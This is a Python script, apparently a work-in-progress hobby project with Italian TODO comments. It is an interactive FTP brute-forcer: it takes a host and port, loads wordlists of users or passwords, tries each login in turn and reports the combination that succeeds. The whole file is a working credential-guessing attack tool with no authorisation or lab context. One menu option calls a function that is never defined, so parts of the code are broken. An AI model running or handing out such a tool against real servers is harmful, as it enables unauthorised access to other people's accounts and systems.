# Libaries
import sys
import time
from ftplib import FTP, error_perm

# List and dictonaries
modes = {
    'a': 'ftp'
}

ftp_modes = {
    '1': 'use the same user and a list of passwords',
    '2': 'use a list of users and the same password',
    '3': 'use lists for both user and password'
}

info = {}

# Ftp
def ftp():
    while True:
        for number, mode in ftp_modes.items():
            print(number + ' -> ' + mode)
        selected_mode = input(
            'Please select the ftp option from the previos ones by typing the correspondive number: '
            )
        if selected_mode == 'q':
            print('Bye!')
            sys.exit
        elif selected_mode == '1':
            ftp_mode_1_connect()
            return None
        elif selected_mode == '2':
            ftp_mode_2_connect()
            return None
        elif selected_mode == '3':
            ftp_mode_3()
            return None
        else:
            print('Mode not found, please try again.')

def ftp_mode_1_info():
    while True:
        info['host'] = input(
            'Enter the host: '
        )
        info['port'] = int(input(
            'Enter the port: '
        ))
        info['user'] = input(
            'Enter the user: '
        )
        password_list_file = input(
            "Please type the file's path containing the passwords' list: "
        )
        try:
            with open(password_list_file, 'r', encoding='utf-8') as file:
                password_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            return password_list

def ftp_mode_1_connect():
    password_list = ftp_mode_1_info()
    ftp = FTP()
    ftp.connect(host=info['host'], port=info['port']) # DA METTERE UN BLOCCO TRY EXCEPT
    for password in password_list:
        try:
            ftp.login(user=info['user'], passwd=password)
        except error_perm:
            print(f'Login failed with user "{info['user']}" and password "{password}".')
        else:
            print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
            break
    ftp.quit()

def ftp_mode_2_info():
    info['host'] = input(
        'Enter the host: '
        )
    info['port'] = int(input(
        'Enter the port: '
    ))
    user_list_file = input(
        "Please type the file's path containing the users' list: "
    )
    info['password'] = input(
        'Enter the password: '
    )
    while True:
        try:
            with open(user_list_file, 'r', encoding='utf-8') as file:
                user_list = [line.strip() for line in file]
        except FileNotFoundError:
            print('This file does not exist, please try again.')
        else:
            return user_list
        
def ftp_mode_2_connect():
    user_list = ftp_mode_2_info()
    ftp = FTP()
    ftp.connect(host=info['host'], port=info['port'])
    for user in user_list:
        try:
            ftp.login(user=user, passwd=info['password'])
        except error_perm:
            print(f'Login failed with user "{user}" and password "{info['password']}".')
        else:
            print(f'Login GRANTED with user "{user}" and password "{info['password']}".')
            break
    ftp.quit()
    
                    


def input_mode():
    while True:
        print('Welcome...')
        for letter, mode in modes.items():
            print(letter + ' -> ' + mode)
        selected_mode = input(
            'Choose the protocol by typing the correspondive letter or type "q" to quit the program: '
        )
        if selected_mode == 'q':
            print('Bye!')
            sys.exit()
        elif selected_mode == 'a':
            ftp()
            return None
        else:
            print('Mode not found, please try again.')

input_mode()

# BISOGNA METTERE UN IF Q DOVE CI SONO GLI INPUT IM MODO CHE SE VOLESSE USCIRE LO PUO FARE
# BISOGNA PENSARE AL DELAY TRA UN TENTATIVO E UN ALTRO PER EVITARE DANNI